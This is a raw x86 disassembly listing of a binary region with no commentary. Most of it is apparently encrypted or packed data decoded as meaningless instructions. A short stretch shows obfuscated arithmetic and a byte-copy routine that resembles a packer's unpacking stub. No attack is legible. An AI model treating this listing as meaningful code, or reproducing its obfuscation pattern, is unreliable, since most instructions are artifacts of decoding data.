  4098b7:	pop    ss
  4098b8:	fnstenv [eax-0x54]
  4098bb:	jp     0x4098de
  4098bd:	icebp  
  4098be:	push   ds
  4098bf:	xor    ebp,DWORD PTR [edi-0x6f12bcbb]
  4098c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098c6:	mov    ch,0xb
  4098c8:	mov    ebp,0x72a9bc40
  4098cd:	ins    DWORD PTR es:[edi],dx
  4098ce:	dec    esi
  4098cf:	pop    ds
  4098d0:	cwde   
  4098d1:	pop    edx
  4098d2:	std    
  4098d3:	push   0xd6a186fa
  4098d8:	sbb    cl,ah
  4098da:	aas    
  4098db:	or     BYTE PTR [edx-0x71],0x79
  4098df:	push   ds
  4098e0:	sbb    DWORD PTR [ebx],0xbc6ac2c
  4098e6:	push   ebx
  4098e7:	lods   eax,DWORD PTR ds:[esi]
  4098e8:	ins    DWORD PTR es:[edi],dx
  4098e9:	sahf   
  4098ea:	jp     0x4098d3
  4098ec:	rcr    DWORD PTR ds:0x62a64335,1
  4098f2:	jmp    0xf8f1:0x991c9147
  4098f9:	xchg   edx,eax
  4098fa:	jmp    0x4098f2
  4098fc:	lock push es
  4098fe:	sub    DWORD PTR [bp+si+0x3c73],esi
  409903:	loope  0x4098de
  409905:	daa    
  409906:	pmaxub mm2,QWORD PTR [ebp+0x2251f64]
  40990d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40990e:	sub    al,0x65
  409910:	jnp    0x40993d
  409912:	rcr    DWORD PTR [eax+0x40ed286e],0xe2
  409919:	add    dh,dh
  40991b:	xor    DWORD PTR [edi-0x47],esi
  40991e:	sbb    BYTE PTR [ebx+0x4c821285],0xad
  409925:	mov    cl,0x64
  409927:	in     al,dx
  409928:	mov    esp,0x7669253c
  40992d:	fld    QWORD PTR [ebp-0x3d]
  409930:	mov    edx,0x135fc7e4
  409935:	out    0x5a,eax
  409937:	sbb    esi,esp
  409939:	mov    DWORD PTR [eax-0x7b],esp
  40993c:	aas    
  40993d:	(bad)  
  40993f:	pcmpgtw mm0,QWORD PTR [ebx-0x3c1f5578]
  409946:	test   DWORD PTR [edx+0x69],ebx
  409949:	sahf   
  40994a:	lds    esi,FWORD PTR [eax]
  40994c:	iret   
  40994d:	bound  ebx,QWORD PTR [edx-0x7497c1fd]
  409953:	xor    BYTE PTR [eax],0xf6
  409956:	and    eax,0x3d78fdf3
  40995b:	pop    edx
  40995c:	aad    0xfa
  40995e:	dec    ebp
  40995f:	xchg   edx,eax
  409960:	add    DWORD PTR [esi-0x6d],ecx
  409963:	xchg   ecx,eax
  409964:	dec    esi
  409965:	xchg   ebx,eax
  409966:	add    al,0xaf
  409968:	and    DWORD PTR [eax+0x11],ecx
  40996b:	inc    ebp
  40996c:	inc    esp
  40996d:	mov    ds:0x66c5c07a,eax
  409972:	cmp    esp,DWORD PTR [eax-0x38]
  409975:	pop    edi
  409976:	or     DWORD PTR [ebx+0x58379b1a],edx
  40997c:	xchg   ebp,eax
  40997d:	stos   DWORD PTR es:[edi],eax
  40997e:	fcmovbe st,st(4)
  409980:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409981:	add    eax,0xe80bc0ab
  409986:	add    BYTE PTR [ebp-0x33],dh
  409989:	ja     0x4099db
  40998b:	adc    ebx,DWORD PTR ds:0x5639d08b
  409991:	pop    ecx
  409992:	xchg   ecx,eax
  409993:	xor    DWORD PTR [edx-0x7d],ebx
  409996:	mov    al,ds:0xc0dbff3c
  40999b:	xchg   esp,eax
  40999c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40999d:	cld    
  40999e:	jno    0x4099b2
  4099a0:	mov    es,WORD PTR [ebp-0x7c]
  4099a3:	mov    dh,0xd0
  4099a5:	shr    DWORD PTR ds:0xb8775628,0x84
  4099ac:	push   eax
  4099ad:	sbb    DWORD PTR [edi],ecx
  4099af:	fmul   QWORD PTR [eax+0x6663ca8b]
  4099b5:	cmp    esp,ebp
  4099b7:	or     al,0x24
  4099b9:	jmp    esi
  4099bb:	(bad)  
  4099bc:	xor    al,0x92
  4099be:	dec    esp
  4099bf:	mov    ds:0xd6b1f5ec,al
  4099c4:	xchg   esp,eax
  4099c5:	cmc    
  4099c6:	sbb    ebp,DWORD PTR [eax]
  4099c8:	loop   0x409967
  4099ca:	pushf  
  4099cb:	mov    ebp,0xe5f5351e
  4099d0:	add    ecx,ebp
  4099d2:	mov    bh,0xfa
  4099d4:	call   FWORD PTR [edi-0x57ed33af]
  4099da:	aad    0x83
  4099dc:	dec    eax
  4099dd:	sub    al,BYTE PTR [edx-0x1cbd769e]
  4099e3:	aaa    
  4099e4:	cmp    ebp,DWORD PTR [esi+0x17457c72]
  4099ea:	jns    0x4099d8
  4099ec:	aaa    
  4099ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4099ee:	arpl   WORD PTR [esi+0x4610f4a1],cx
  4099f4:	add    al,0xd5
  4099f6:	pusha  
  4099f7:	into   
  4099f8:	bound  ebx,QWORD PTR [esi+0x63eefc9e]
  4099fe:	pusha  
  4099ff:	push   0xffffffdf
  409a01:	int3   
  409a02:	jmp    0x8c65d8dc
  409a07:	xor    BYTE PTR [edx-0x52],bl
  409a0a:	push   0xffffffff
  409a0c:	mov    BYTE PTR [edx+eiz*2+0x6aa29773],bl
  409a13:	or     esp,DWORD PTR [ebx]
  409a15:	retf   
  409a16:	jmp    0x409a26
  409a18:	ja     0x4099ce
  409a1a:	sub    esi,edi
  409a1c:	(bad)  
  409a1d:	pop    esp
  409a1e:	cmp    eax,0x5d5c0ae6
  409a23:	xor    edi,edx
  409a25:	jne    0x409a8f
  409a27:	or     DWORD PTR [edi],esp
  409a29:	mov    esp,DWORD PTR ds:0x87055f37
  409a2f:	hlt    
  409a30:	fwait
  409a31:	push   eax
  409a32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409a33:	inc    edi
  409a34:	aam    0x42
  409a36:	mov    ebp,esi
  409a38:	sub    esp,ebp
  409a3a:	jl     0x409a63
  409a3c:	(bad)  
  409a3e:	pushf  
  409a3f:	(bad)  
  409a40:	push   esp
  409a41:	mov    bl,0x43
  409a43:	shl    BYTE PTR [eax+0x2e199699],1
  409a49:	fmul   QWORD PTR [ecx-0x2c]
  409a4c:	setb   BYTE PTR [edx-0x67]
  409a50:	test   al,0xd2
  409a52:	sub    ch,BYTE PTR [ecx]
  409a54:	cwde   
  409a55:	push   ss
  409a56:	push   es
  409a57:	ret    0x96d0
  409a5a:	mov    esp,0xc2c4ef0d
  409a5f:	push   edi
  409a60:	idiv   DWORD PTR [esi-0x47]
  409a63:	push   cs
  409a64:	ror    esi,cl
  409a66:	imul   ebp,DWORD PTR [ebp+0x45c78d88],0xc
  409a6d:	ss add BYTE PTR fs:[eax],al
  409a71:	mov    eax,ds:0x4226d0
  409a76:	mov    ecx,DWORD PTR [ebp+0x8]
  409a79:	or     eax,ecx
  409a7b:	mov    ecx,DWORD PTR ds:0x4226cc
  409a81:	or     eax,0x7274
  409a86:	add    ecx,eax
  409a88:	mov    eax,ds:0x4226c8
  409a8d:	or     eax,ecx
  409a8f:	mov    ecx,DWORD PTR ds:0x4226c4
  409a95:	xor    ecx,eax
  409a97:	xor    ecx,0xee6f
  409a9d:	mov    DWORD PTR [ebp+0x8],0x5006
  409aa4:	mov    eax,ds:0x4226e4
  409aa9:	mov    edx,DWORD PTR ds:0x4226e0
  409aaf:	or     eax,0x727e
  409ab4:	imul   edx,eax
  409ab7:	mov    eax,ds:0x4226ec
  409abc:	mov    esi,DWORD PTR [ebp+0x8]
  409abf:	imul   eax,eax,0x78ce
  409ac5:	xor    esi,edx
  409ac7:	xor    eax,0x4b7b
  409acc:	or     esi,0x7928
  409ad2:	xor    esi,0x33904f9c
  409ad8:	mov    edx,ecx
  409ada:	sub    edx,esi
  409adc:	mov    esi,DWORD PTR ds:0x4226e8
  409ae2:	jmp    0x409e16
  409ae7:	mov    ah,0xbd
  409ae9:	sub    al,0x79
  409aeb:	sub    eax,0x59bdb579
  409af0:	scas   al,BYTE PTR es:[edi]
  409af1:	out    dx,eax
  409af2:	cmp    edx,DWORD PTR [ebp-0x42bad6db]
  409af8:	jle    0x409ab5
  409afa:	mov    ebx,0xbbbbc5e5
  409aff:	shr    DWORD PTR [ebx+ebx*2+0xb],0xa4
  409b04:	push   ss
  409b05:	mov    ah,0xa6
  409b07:	push   0x79
  409b09:	not    BYTE PTR [ecx+eax*8+0x69]
  409b0d:	fadd   DWORD PTR [esi]
  409b0f:	es mov ebp,0x9556b773
  409b15:	and    eax,0x46e6ae67
  409b1a:	xchg   BYTE PTR [ebp+0x21eed418],ch
  409b20:	test   eax,0xf7c52c74
  409b25:	sub    eax,0xa5f809a2
  409b2a:	aad    0x28
  409b2c:	popf   
  409b2d:	pushf  
  409b2e:	xchg   edi,eax
  409b2f:	jg     0x409af6
  409b31:	test   al,0x86
  409b33:	push   0x9394995e
  409b38:	adc    edi,DWORD PTR [ebp-0x72]
  409b3b:	adc    cl,BYTE PTR [ebx-0x63]
  409b3e:	cmp    al,0x80
  409b40:	push   edi
  409b41:	outs   dx,BYTE PTR ds:[esi]
  409b42:	add    eax,0xa4f8f2af
  409b47:	jb     0x409b73
  409b49:	imul   ecx,DWORD PTR [ebp-0x2e],0x4b2a375
  409b50:	jmp    0x732c1195
  409b55:	push   0xb8860f7
  409b5a:	test   BYTE PTR [ebp-0x2b],bh
  409b5d:	retf   
  409b5e:	or     DWORD PTR [eax+eiz*4],0x36a824a2
  409b65:	shr    BYTE PTR [esi],1
  409b67:	cmp    ch,BYTE PTR [ecx]
  409b69:	in     eax,dx
  409b6a:	inc    ebx
  409b6b:	mov    al,0xb5
  409b6d:	out    dx,al
  409b6e:	dec    ecx
  409b6f:	jne    0x409b17
  409b71:	test   cl,ch
  409b73:	lds    esp,FWORD PTR [esp+eax*1]
  409b76:	inc    ebx
  409b77:	imul   esi,DWORD PTR [edi+ebp*1+0x47],0x66
  409b7c:	sub    BYTE PTR [edi+eiz*1-0x6],dl
  409b80:	add    BYTE PTR es:[ebx],bh
  409b83:	inc    ebp
  409b84:	aam    0xf1
  409b86:	fldcw  WORD PTR [eax]
  409b88:	(bad)
  409b8b:	push   ebx
  409b8c:	sub    ebx,DWORD PTR [edi]
  409b8e:	sub    DWORD PTR [eax],ebx
  409b90:	sub    ah,BYTE PTR [edi-0x5f]
  409b93:	aad    0xb0
  409b95:	mov    ss,esi
  409b97:	retf   0x7682
  409b9a:	adc    edx,DWORD PTR [ebp-0x3977424c]
  409ba0:	jns    0x409bfc
  409ba2:	out    0x4d,eax
  409ba4:	int3   
  409ba5:	out    0x8d,eax
  409ba7:	shl    BYTE PTR [ecx],1
  409ba9:	xor    esi,DWORD PTR [esp+ebp*1+0x54]
  409bad:	mov    cl,0xe1
  409baf:	jno    0x409c0b
  409bb1:	in     eax,dx
  409bb2:	jge    0x409b4e
  409bb4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bb5:	push   0xe3709365
  409bba:	js     0x409b44
  409bbc:	jmp    0x409bdf
  409bbe:	sub    ebx,edi
  409bc0:	cdq    
  409bc1:	fadd   QWORD PTR [eax+0x35e4aae6]
  409bc7:	cmp    eax,0xd8ef8c87
  409bcc:	push   0x14
  409bce:	and    ebx,eax
  409bd0:	jbe    0x409b92
  409bd2:	scas   eax,DWORD PTR es:[edi]
  409bd3:	inc    ebp
  409bd4:	daa    
  409bd5:	xchg   esi,eax
  409bd6:	je     0x409b58
  409bd8:	xor    eax,DWORD PTR [eax]
  409bda:	xchg   ebp,eax
  409bdb:	mov    dh,bl
  409bdd:	or     ch,BYTE PTR [ebx]
  409bdf:	sub    BYTE PTR [ebx+0x7d286f83],0x7f
  409be6:	lea    edx,[ebp-0x7e]
  409be9:	mov    bh,0xb8
  409beb:	sbb    BYTE PTR [eax+0x7533b10a],cl
  409bf1:	(bad)  
  409bf2:	ja     0x409be2
  409bf4:	das    
  409bf5:	cdq    
  409bf6:	aaa    
  409bf7:	ret    
  409bf8:	fmulp  st(4),st
  409bfa:	leave  
  409bfb:	test   dh,0x4b
  409bfe:	pop    es
  409bff:	pop    eax
  409c00:	mov    dh,0xe2
  409c02:	loope  0x409c40
  409c04:	push   ds
  409c05:	fnsave [edi]
  409c07:	xchg   ecx,eax
  409c08:	push   cs
  409c09:	add    BYTE PTR [esi+eax*4+0x31],cl
  409c0d:	sbb    ebx,eax
  409c0f:	mov    ebp,0x4e08cf69
  409c14:	xor    eax,0x52309534
  409c19:	ins    DWORD PTR es:[edi],dx
  409c1a:	dec    edx
  409c1b:	repnz hlt 
  409c1d:	test   DWORD PTR [ebx+0x7e],esi
  409c20:	inc    ecx
  409c21:	into   
  409c22:	aad    0xd4
  409c24:	ds push ss
  409c26:	aad    0x2c
  409c28:	jl     0x409bc7
  409c2a:	out    dx,al
  409c2b:	ror    esi,0xa
  409c2e:	add    al,0x62
  409c30:	(bad)  
  409c31:	ficom  WORD PTR [eax+0x4303e5fd]
  409c37:	mov    ebp,ebx
  409c39:	mov    ch,0xf2
  409c3b:	push   0xde2a3e2c
  409c40:	daa    
  409c41:	add    bh,0x83
  409c44:	push   edi
  409c45:	or     al,0xbf
  409c47:	retf   0xd4ac
  409c4a:	add    dl,BYTE PTR ds:0xa19c9072
  409c50:	pop    edi
  409c51:	loop   0x409bdb
  409c53:	or     eax,DWORD PTR [eax-0x3d]
  409c56:	repnz iret 
  409c58:	ret    
  409c59:	push   edx
  409c5a:	out    0xc6,eax
  409c5c:	mov    eax,ds:0x9242eb5a
  409c61:	and    BYTE PTR [ecx],ah
  409c63:	imul   BYTE PTR [ecx+ebp*4]
  409c66:	lahf   
  409c67:	js     0x409c86
  409c69:	stos   DWORD PTR es:[edi],eax
  409c6a:	dec    esi
  409c6b:	add    esi,ebx
  409c6d:	scas   al,BYTE PTR es:[di]
  409c6f:	and    al,0x2
  409c71:	cmp    BYTE PTR [edi+0x4f],dl
  409c74:	mov    al,0xa5
  409c76:	xchg   edx,eax
  409c77:	outs   dx,BYTE PTR ds:[esi]
  409c78:	pop    es
  409c79:	sub    DWORD PTR [edi],esi
  409c7b:	imul   esi,DWORD PTR [esi],0xffffffa3
  409c7e:	test   BYTE PTR [ebp+0x1816337f],ch
  409c84:	and    BYTE PTR [ecx],dh
  409c86:	test   DWORD PTR [ecx+0x2d1aaa33],ebx
  409c8c:	int3   
  409c8d:	sbb    BYTE PTR [ebp-0x30b2988b],bh
  409c93:	mov    ecx,0xe6e2ce0b
  409c98:	or     eax,0x93d63a3d
  409c9d:	inc    eax
  409c9e:	and    DWORD PTR [eax-0x31869d0b],eax
  409ca4:	jae    0x409c71
  409ca6:	sbb    bl,BYTE PTR [ebp+0x18c8ef12]
  409cac:	ret    0xac42
  409caf:	in     al,dx
  409cb0:	sbb    dh,dl
  409cb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cb3:	jp     0x409d32
  409cb5:	call   0xcb651864
  409cba:	fst    st(2)
  409cbc:	div    cl
  409cbe:	pop    edx
  409cbf:	jmp    0x9d0b0249
  409cc4:	test   eax,0xebd6f2cd
  409cc9:	cld    
  409cca:	dec    esi
  409ccb:	fucomi st,st(2)
  409ccd:	push   esp
  409cce:	sub    BYTE PTR [eax],dh
  409cd0:	sti    
  409cd1:	out    dx,al
  409cd2:	inc    ecx
  409cd3:	xchg   esp,eax
  409cd4:	out    dx,al
  409cd5:	lea    esp,fs:[edi-0x20d786f6]
  409cdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cdd:	addr16 gs inc edi
  409ce0:	clc    
  409ce1:	mov    eax,0x3e69aa16
  409ce6:	sbb    ebx,DWORD PTR [ecx-0x40]
  409ce9:	pop    ecx
  409cea:	arpl   WORD PTR [edi-0x40c5b41d],ax
  409cf0:	shr    DWORD PTR [edx-0x56],cl
  409cf3:	fcmovnb st,st(7)
  409cf5:	aam    0x64
  409cf7:	ror    bl,1
  409cf9:	mov    ch,0x88
  409cfb:	in     al,dx
  409cfc:	push   esp
  409cfd:	jno    0x409ce4
  409cff:	pushf  
  409d00:	adc    ecx,DWORD PTR [edi-0x20]
  409d03:	sbb    BYTE PTR [eax-0x62],dh
  409d06:	xchg   edx,eax
  409d07:	mov    edi,0xabbe4d3d
  409d0c:	lods   al,BYTE PTR ds:[esi]
  409d0d:	call   0xe364:0xf1eeae03
  409d14:	in     al,0x26
  409d16:	adc    esp,0x30
  409d19:	push   ebx
  409d1a:	dec    DWORD PTR [ecx-0x38]
  409d1d:	adc    eax,0x85334f9f
  409d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d23:	scas   al,BYTE PTR es:[edi]
  409d24:	(bad)  
  409d25:	icebp  
  409d26:	push   0x22
  409d28:	sbb    BYTE PTR [edx+edx*8+0x48e18a1e],cl
  409d2f:	adc    eax,DWORD PTR [ebp+0x33]
  409d32:	lea    esp,[eax-0x11]
  409d35:	imul   edi,DWORD PTR [edx],0xc195e77f
  409d3b:	call   0xd5edef39
  409d40:	mov    bh,0x47
  409d42:	and    edx,DWORD PTR [ebx]
  409d44:	cli    
  409d45:	outs   dx,DWORD PTR ds:[esi]
  409d46:	cmp    al,0x4
  409d48:	inc    esp
  409d49:	test   DWORD PTR [ecx+edx*1-0x4ef0dc19],ebp
  409d50:	test   al,0x5b
  409d52:	xor    esp,esp
  409d54:	cld    
  409d55:	in     al,0xee
  409d57:	adc    BYTE PTR [esi+0x2dc28e46],ah
  409d5d:	and    DWORD PTR [esi-0x7768b3a],esp
  409d63:	mov    DWORD PTR [eax+0x7b],ecx
  409d66:	jnp    0x409db7
  409d68:	and    al,0x48
  409d6a:	je     0x409d5f
  409d6c:	inc    esp
  409d6d:	js     0x409de4
  409d6f:	add    ah,BYTE PTR [edi]
  409d71:	push   ds
  409d72:	js     0x409d2c
  409d74:	dec    esp
  409d75:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d76:	xchg   DWORD PTR [eax-0x80],esi
  409d79:	das    
  409d7a:	or     al,0x16
  409d7c:	adc    al,0xf2
  409d7e:	adc    eax,0x430257fc
  409d83:	jle    0x409da1
  409d85:	inc    esp
  409d86:	jg     0x409d1d
  409d88:	xor    DWORD PTR [eax+0x2ec9fed3],ebx
  409d8e:	dec    eax
  409d8f:	mov    eax,0x4a49b505
  409d94:	mov    edx,0x7b51e523
  409d99:	push   ds
  409d9a:	arpl   WORD PTR [eax+0x42],ax
  409d9d:	mov    DWORD PTR [edx+0x2c630fc4],0xd1a68802
  409da7:	icebp  
  409da8:	shl    eax,cl
  409daa:	xor    al,0xde
  409dac:	xchg   edx,eax
  409dad:	data16 in al,0x3f
  409db0:	repz cmp ah,cl
  409db3:	pop    ds
  409db4:	dec    esp
  409db5:	ins    BYTE PTR es:[edi],dx
  409db6:	sub    al,0x15
  409db8:	mov    BYTE PTR [edx+0x69b51d4],0xd3
  409dbf:	pop    ds
  409dc0:	ja     0x409d69
  409dc2:	loopne 0x409dfb
  409dc4:	enter  0x8ed8,0x17
  409dc8:	push   ebp
  409dc9:	push   es
  409dca:	sbb    edx,0x543f8df8
  409dd0:	int    0xb3
  409dd2:	xor    BYTE PTR [eax],cl
  409dd4:	jne    0x409e4e
  409dd6:	test   DWORD PTR [ebp+0x4f657bf7],edi
  409ddc:	lea    eax,[ebx+0x724c3960]
  409de2:	xchg   BYTE PTR [ecx-0x9fc8ae7],cl
  409de8:	inc    eax
  409de9:	jb     0x409dba
  409deb:	aad    0xf9
  409ded:	sub    esp,DWORD PTR [edx-0x6a]
  409df0:	or     bl,bh
  409df2:	adc    esi,DWORD PTR [esi+0x13]
  409df5:	cmp    edx,DWORD PTR [eax]
  409df7:	cli    
  409df8:	cmp    DWORD PTR [esi],edx
  409dfa:	mov    edi,0xad8a0afe
  409dff:	mov    dl,0x79
  409e01:	mov    ds:0x58467386,eax
  409e06:	(bad)  
  409e07:	(bad)  
  409e08:	or     eax,0x3ad743a
  409e0d:	xor    eax,0xc25475a5
  409e12:	sbb    esi,edx
  409e14:	adc    ah,ch
  409e16:	sub    eax,esi
  409e18:	mov    esi,DWORD PTR ds:0x4222a8
  409e1e:	mov    esi,DWORD PTR [esi+0x1d4]
  409e24:	xor    eax,0x1d2bc62e
  409e29:	sub    esi,eax
  409e2b:	mov    eax,DWORD PTR [ebp+0x10]
  409e2e:	mov    al,BYTE PTR [edx+eax*1]
  409e31:	mov    BYTE PTR [esi+ecx*1],al
  409e34:	mov    eax,ds:0x4226dc
  409e39:	mov    edx,DWORD PTR ds:0x4226d8
  409e3f:	imul   eax,eax,0x797a
  409e45:	and    edx,eax
  409e47:	mov    eax,DWORD PTR [ebp+0xc]
  409e4a:	sub    eax,0x1068
  409e4f:	lea    ecx,[ecx+edx*1-0x1cff]
  409e56:	mov    edx,DWORD PTR ds:0x4226d4
  409e5c:	jmp    0x40a190
  409e61:	fnstenv [ecx]
  409e63:	sub    BYTE PTR ds:0x357dbda9,0x96
  409e6a:	dec    esi
  409e6b:	sbb    esi,DWORD PTR [ecx]
  409e6d:	adc    esp,edx
  409e6f:	std    
  409e70:	das    
  409e71:	fild   WORD PTR [esi-0x3a1a4445]
  409e77:	mov    ebx,0xaa27cbbb
  409e7c:	push   edx
  409e7d:	sbb    dl,BYTE PTR [ebx-0x6a]
  409e80:	sub    esi,DWORD PTR [ecx+0x71ad4129]
  409e86:	xchg   esi,eax
  409e87:	inc    ecx
  409e88:	push   ebx
  409e89:	pop    edx
  409e8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409e8b:	call   0x8b76:0xd0ffc285
  409e92:	or     ebx,DWORD PTR [eax]
  409e94:	test   al,0x1
  409e96:	std    
  409e97:	adc    eax,edi
  409e99:	pop    ss
  409e9a:	retf   0x970e
  409e9d:	add    eax,0x67eb9f89
  409ea2:	aam    0xf5
  409ea4:	cmp    ebx,ecx
  409ea6:	mov    dl,0x53
  409ea8:	sub    eax,0x301778bc
  409ead:	call   0x5db4:0x670f2c93
  409eb4:	push   ecx
  409eb5:	jns    0x409ec1
  409eb7:	mov    esi,0x8cfd257f
  409ebc:	data16 int3 
  409ebe:	fimul  DWORD PTR [eax-0x8]
  409ec1:	jbe    0x409e60
  409ec3:	inc    esi
  409ec4:	and    DWORD PTR [esi+esi*2],ecx
  409ec7:	xor    dh,BYTE PTR [eax+0x48]
  409eca:	jae    0x409ef8
  409ecc:	or     ah,BYTE PTR [eax]
  409ece:	mov    edx,0xbca0a3da
  409ed3:	lock mov bl,0xab
  409ed6:	or     esi,ecx
  409ed8:	call   0xab26:0x2d4a5276
  409edf:	xchg   BYTE PTR [edi],cl
  409ee1:	and    BYTE PTR [edx],al
  409ee3:	fcomp  DWORD PTR [ebx-0x71]
  409ee6:	dec    ecx
  409ee7:	out    0xc1,eax
  409ee9:	inc    ebx
  409eea:	jge    0x409f51
  409eec:	fsubr  DWORD PTR [edx+esi*2+0x2a]
  409ef0:	int    0x9d
  409ef2:	push   ecx
  409ef3:	pop    esp
  409ef4:	repz cmp BYTE PTR [ecx],cl
  409ef7:	xchg   esp,eax
  409ef8:	and    edi,DWORD PTR [edx]
  409efa:	in     eax,0x8b
  409efc:	sub    dh,cl
  409efe:	stos   BYTE PTR es:[edi],al
  409eff:	push   ecx
  409f00:	dec    esp
  409f01:	push   esi
  409f02:	jmp    0xa4d4:0xa3296f70
  409f09:	mov    eax,ds:0xf7b35edd
  409f0e:	sbb    al,0xe6
  409f10:	adc    DWORD PTR [esi],ebp
  409f12:	jle    0x409ecf
  409f14:	mov    bh,0x78
  409f16:	daa    
  409f17:	jge    0x409f29
  409f19:	mov    eax,0xb6c3b502
  409f1e:	adc    DWORD PTR [edx],ecx
  409f20:	cs enter 0xd645,0x1
  409f25:	(bad)  
  409f26:	int    0xb9
  409f28:	lock ret 0xb44a
  409f2c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f2d:	or     ebp,DWORD PTR [esi-0x7e8ce1fa]
  409f33:	cmp    dh,dh
  409f35:	mov    ds:0x42f053fb,eax
  409f3a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f3b:	jns    0x409f4a
  409f3d:	fisub  WORD PTR [eax-0x66]
  409f40:	or     eax,0x8e2773f2
  409f45:	jmp    DWORD PTR [esi]
  409f47:	(bad)  
  409f48:	out    0x8c,al
  409f4a:	xchg   BYTE PTR [ebx+0x7d9255c],bh
  409f50:	push   0x866a3468
  409f55:	shl    ecx,0x30
  409f58:	hlt    
  409f59:	inc    ebp
  409f5a:	mov    eax,0xb51805f3
  409f5f:	jns    0x409f7b
  409f61:	lock test eax,0x23360e72
  409f67:	cs nop
  409f69:	xchg   esp,eax
  409f6a:	retf   
  409f6b:	xchg   esp,eax
  409f6c:	pop    ebp
  409f6d:	(bad)  
  409f6e:	hlt    
  409f6f:	xchg   DWORD PTR [eax],esi
  409f71:	aas    
  409f72:	xor    BYTE PTR [ebx+0x5f4ae5f],bh
  409f78:	add    al,0xd8
  409f7a:	sub    BYTE PTR [ecx+0x53a3ad11],dl
  409f80:	and    bl,BYTE PTR [edi-0xe]
  409f83:	xor    al,0x7f
  409f85:	cdq    
  409f86:	sti    
  409f87:	aad    0x44
  409f89:	adc    bl,BYTE PTR [edi]
  409f8b:	mov    dl,0xb3
  409f8d:	dec    ebx
  409f8f:	dec    esp
  409f90:	popf   
  409f91:	pop    edx
  409f92:	inc    ebp
  409f93:	mov    esi,0x8513174f
  409f98:	(bad)  
  409f99:	fxam   
  409f9b:	test   DWORD PTR [edi-0x5e],ebx
  409f9e:	aas    
  409f9f:	mov    ch,0x71
  409fa1:	push   ebx
  409fa2:	inc    ebx
  409fa3:	loopne 0x40a00e
  409fa5:	mov    dh,0x6e
  409fa7:	dec    ebp
  409fa8:	outs   dx,BYTE PTR ds:[esi]
  409fa9:	or     ebx,DWORD PTR [eax-0x72]
  409fac:	adc    DWORD PTR ds:0x674ed233,0x7c
  409fb3:	jae    0x409f81
  409fb5:	sbb    DWORD PTR [eax+esi*4],ebx
  409fb8:	fs and dl,bl
  409fbb:	sbb    eax,0x210592d7
  409fc0:	dec    esp
  409fc1:	dec    ebp
  409fc2:	jmp    0x24f752eb
  409fc7:	adc    DWORD PTR [ecx-0x5e0095a1],ecx
  409fcd:	test   BYTE PTR [eax],bl
  409fcf:	imul   ebx,eax,0xfffffff2
  409fd2:	add    DWORD PTR [ecx],esi
  409fd4:	push   cs
  409fd5:	add    esp,DWORD PTR [esi]
  409fd7:	jno    0x40a022
  409fd9:	push   edx
  409fda:	imul   edx,DWORD PTR [edi-0x52af9ea2],0xfffffffc
  409fe1:	mov    bl,0xc8
  409fe3:	mov    esp,edx
  409fe5:	sbb    cl,BYTE PTR [esi+edx*2-0x4c76e9ef]
  409fec:	jnp    0x40a051
  409fee:	loop   0x40a05e
  409ff0:	add    eax,0xb5a20aee
  409ff5:	add    al,0x7b
  409ff7:	inc    esi
  409ff8:	push   edx
  409ff9:	adc    eax,0xb74ae7bc
  409ffe:	cmp    BYTE PTR [edx-0x635a5b1d],ah
  40a004:	push   edi
  40a005:	push   es
  40a006:	cmp    BYTE PTR ds:0xc45a688f,dh
  40a00c:	xchg   edi,eax
  40a00d:	xor    al,0x36
  40a00f:	push   0x5e
  40a011:	push   ebp
  40a013:	mov    bh,0xff
  40a015:	cld    
  40a016:	stc    
  40a017:	in     al,0xf9
  40a019:	(bad)  
  40a01a:	sub    eax,0x76d28579
  40a01f:	mov    edx,0x45e7ed75
  40a024:	pop    ebx
  40a025:	or     ebp,DWORD PTR [ebx+0x454509fe]
  40a02b:	enter  0x525c,0x48
  40a02f:	icebp  
  40a030:	int3   
  40a031:	ret    
  40a032:	(bad)  
  40a033:	jmp    0x409fcf
  40a035:	or     bh,BYTE PTR [esi]
  40a037:	imul   edx,DWORD PTR [ebx],0x24d580e
  40a03d:	or     BYTE PTR [edi-0x2d752683],ah
  40a043:	add    esp,DWORD PTR fs:[ebx+0x25cba16]
  40a04a:	inc    ebp
  40a04b:	xor    DWORD PTR [eax],ebp
  40a04d:	adc    ebp,DWORD PTR [eax]
  40a04f:	push   cs
  40a050:	or     al,0x84
  40a052:	sbb    BYTE PTR ds:0x47d23e1b,ch
  40a058:	xor    al,0xe2
  40a05a:	inc    ebp
  40a05b:	ja     0x40a051
  40a05d:	push   eax
  40a05e:	lahf   
  40a05f:	xor    DWORD PTR [ecx+0x67260262],0xffffffe8
  40a066:	adc    eax,0xf6e60256
  40a06b:	cmp    eax,0x6b9bad2b
  40a070:	sub    DWORD PTR [edi-0x286a25f6],edx
  40a076:	xor    DWORD PTR [esi+ecx*4],ecx
  40a079:	push   ebx
  40a07a:	test   DWORD PTR [edi+edi*2-0x3b],0x3e4b5c14
  40a082:	inc    ecx
  40a083:	rcl    BYTE PTR [ecx+ebp*8],cl
  40a086:	push   DWORD PTR [ebp+0x2b364c3a]
  40a08c:	std    
  40a08d:	jg     0x40a0e0
  40a08f:	js     0x40a029
  40a091:	mov    WORD PTR [ebp-0x2e54ade2],ds
  40a097:	push   ss
  40a098:	shl    BYTE PTR [eax+edx*2-0x106816f8],cl
  40a09f:	xor    bh,BYTE PTR [ebx-0x25]
  40a0a2:	dec    ebp
  40a0a3:	leave  
  40a0a4:	sar    DWORD PTR [edi+0x2e1b22e3],0x52
  40a0ab:	xchg   ebp,eax
  40a0ac:	out    0x40,al
  40a0ae:	inc    edi
  40a0af:	or     BYTE PTR [ebp+ecx*4+0x3d9a5a0b],0x76
  40a0b7:	jnp    0x40a10e
  40a0b9:	xchg   ebx,eax
  40a0ba:	fs or  ebx,esp
  40a0bd:	mov    al,ds:0xb39cf6b0
